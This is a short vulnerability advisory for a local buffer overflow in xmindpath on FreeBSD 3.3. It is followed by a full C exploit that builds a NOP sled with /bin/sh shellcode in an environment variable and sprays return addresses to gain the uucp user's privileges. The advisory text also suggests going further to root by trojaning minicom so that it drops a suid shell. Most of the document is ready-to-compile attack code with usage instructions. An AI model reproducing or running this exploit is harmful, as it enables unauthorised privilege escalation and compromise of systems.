source: http://www.securityfocus.com/bid/839/info

The version of xmindpath shipped with FreeBSD 3.3 can be locally exploited via overrunning a buffer of predefined length. It is possible to gain the effective userid of uucp through this vulnerability. It may be possible, after attaining uucp priviliges, to modify binaries to which uucp has write access to and trojan them to further elevate priviliges), ie: modify minicom so that when root runs it, drops a suid shell somewhere. 

/*
 *
 * FreeBSD 3.3 xmindpath exploit gives euid uucp
 * Compile: gcc -o xmindx xmindx.c
 * Usage: ./xmindx <offset>
 /path/to/mindpath -f $RET
 * Brock Tellier <btellier@usa.net>
 *
 */
 
 #include <stdlib.h>
 #include <stdio.h>
 

 char shell[]= /* mudge@l0pht.com */
 "\xeb\x35\x5e\x59\x33\xc0\x89\x46\xf5\x83\xc8\x07\x66\x89\x46\xf9"
 "\x8d\x1e\x89\x5e\x0b\x33\xd2\x52\x89\x56\x07\x89\x56\x0f\x8d\x46"
 "\x0b\x50\x8d\x06\x50\xb8\x7b\x56\x34\x12\x35\x40\x56\x34\x12\x51"
 "\x9a>:)(:<\xe8\xc6\xff\xff\xff/bin/sh";
 

 #define EGGLEN 2048
 #define RETLEN 279
 #define ALIGN 3
 #define NOP 0x90

 int main(int argc, char *argv[]) {
 

 long int offset=0;
 int i;
 int egglen = EGGLEN;
 int retlen = RETLEN;
 long int addr = 0xbfbfcfa8;
 char egg[EGGLEN];
 char ret[RETLEN];


 if (argc == 2) offset = atoi(argv[1]);


 addr=addr + offset;

 fprintf(stderr, "FreeBSD xmindpath exploit /path/to/xmindpath -f $RET\n");
 fprintf(stderr, "Brock Tellier btellier@usa.net\n");
 fprintf(stderr, "Using addr: 0x%x\n", addr);

 memset(egg,NOP,egglen);
 memcpy(egg+(egglen - strlen(shell) - 1),shell,strlen(shell));
  

 for(i=ALIGN;i< retlen;i+=4)
 *(int *)&ret[i]=addr;
 

 memcpy(egg, "EGG=", 4);
 putenv(egg);
 memcpy(ret,"RET=",4);
 putenv(ret);

 system("/usr/local/bin/bash");

 }




